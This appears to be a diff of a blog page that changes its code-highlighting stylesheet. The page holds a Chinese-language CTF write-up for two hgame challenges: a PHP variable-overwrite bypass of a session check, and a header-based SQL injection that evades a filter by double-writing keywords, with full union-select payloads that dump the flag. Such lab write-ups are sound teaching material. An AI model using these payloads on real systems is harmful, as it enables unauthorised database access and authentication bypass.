@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -240,7 +248,7 @@
             <div class="markdown-body">
               <h2 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h2><p><img src="https://sc04.alicdn.com/kf/H8e78f14012ee46188cad7f4cfdbcb8bev.jpg" srcset="/img/loading.gif" alt="01.png"></p>
 <p>dirsearch扫出<code>www.zip</code><br>主要的：<br><code>flag.php</code>:         </p>
-<div class="hljs"><pre><code>&lt;?php
+<pre><code>&lt;?php
 session_start();
 
 require_once &#39;lazy.php&#39;;
@@ -268,10 +276,10 @@ if(!isset($_SESSION[&#39;username&#39;]))&#123;
             echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;篡位者占领了神圣的页面&lt;/h3&gt;&quot;;
         &#125;
     &#125;
-        ?&gt;    </code></pre></div>
+        ?&gt;    </code></pre>
 <p>要想得到flag，username===admin<br><code>flag.php</code>包含了<code>lazy.php</code>         </p>
 <p><code>lazy.php</code>:      </p>
-<div class="hljs"><pre><code>&lt;?php
+<pre><code>&lt;?php
 $filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];
 
 // 直接注册所有变量，这样我就能少打字力，芜湖~
@@ -283,21 +291,21 @@ foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $_request)&#123;
         &#125;
         $&#123;$_k&#125; = $_v;
     &#125;
-&#125;         </code></pre></div>
+&#125;         </code></pre>
 <p>第一个循环，将GET和POST得到的数据给<code>$_request</code><br>第二个循环，将键值分别赋给<code>$_k</code>和<code>$_v</code><br>第三个循环，过滤<code>$filter</code>中的词<br>传入<code>username=admin</code><br>经过<code>$&#123;$_k&#125; = $_v</code>,就成了<code>$username=admin</code><br>给的wp中是<code>_SESSISESSIONON[username]=admin</code><br>经过<code>lazy.php</code>后是<code>$_SESSION=$_v</code>而<code>$_v</code>是一个数组，<code>array(1) &#123; [&quot;username&quot;]=&gt; string(5) &quot;admin&quot; &#125;</code><br>所以<code>$_SESSION[username]=admin</code>达到变量覆盖            </p>
 <p>至于wp中所说的，键不能带引号：   </p>
-<div class="hljs"><pre><code>&lt;?php
+<pre><code>&lt;?php
 $A=[&quot;&#39;lisi&#39;&quot;=&gt;15,&quot;zhangsan&quot;=&gt;11];
 var_dump($A[&#39;lisi&#39;]);
-?&gt;  </code></pre></div>
+?&gt;  </code></pre>
 <p>这样一串代码，输出的是<code>NULL</code>,而<code>var_dump(zhangsan)</code>是可以正常输出的        </p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/7768580.html">变量覆盖</a>     </p>
 <h2 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h2><p><img src="https://sc04.alicdn.com/kf/H5e86506d64a6482dbf4a1e7e31d70405r.jpg" srcset="/img/loading.gif" alt="02.png"><br>点击<code>Reload</code>可以在开发工具的网络中发现一个<code>server.php</code><br>抓包<br>在js中发现页面的不同显示是status不同的数字<br>在请求头中加入status，使其等于不同数值，即可回显不同信息<br><code>status:  1&#39;</code>没有回显，加上<code>#</code>正常<br>存在SQL注入—–单引号<br>有过滤<code> [&#39;select&#39;, &#39;SELECT&#39;, &#39;from&#39;, &#39;FROM&#39;, &#39;union&#39;, &#39;UNION&#39;, &#39;where&#39;, &#39;WHERE&#39;, &#39; &#39;]</code><br>可以用异或检验：   </p>
-<div class="hljs"><pre><code>1^1=0
+<pre><code>1^1=0
 0^0=0
 1^0=1
 0---------&gt;HTTP 200 OK       
-1---------&gt;NETWORK ERROR        </code></pre></div>
+1---------&gt;NETWORK ERROR        </code></pre>
 <p><code>1^if(length(&#39;select&#39;)&gt;1,1,0)#</code>返回的是NETWORK ERROR<br>双写可以绕过，或者改字母大小写；空格用<code>/**/</code>代替，或者括号将语句括起来<br><code>-1&#39;/**/ununionion/**/selselectect/**/database()#</code>库名—–&gt;week2sqli<br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(table_name)/**/frOm/**/information_schema.tables/**/wHere/**/table_schema=&#39;week2sqli&#39;#</code>表名———–&gt;<code>f1111111144444444444g</code>,<code>status</code><br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(column_name)/**/frOm/**/information_schema.columns/**/wHere/**/table_name=&#39;f1111111144444444444g&#39;#</code>列——–&gt;<code>ffffff14gggggg</code><br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(ffffff14gggggg)/**/frOm/**/f1111111144444444444g#</code>字段———-&gt;<code>hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)&#125;</code>        </p>
 
             </div>
@@ -443,6 +451,8 @@ var_dump($A[&#39;lisi&#39;]);
 
 
 
+  
+    
   
 
 
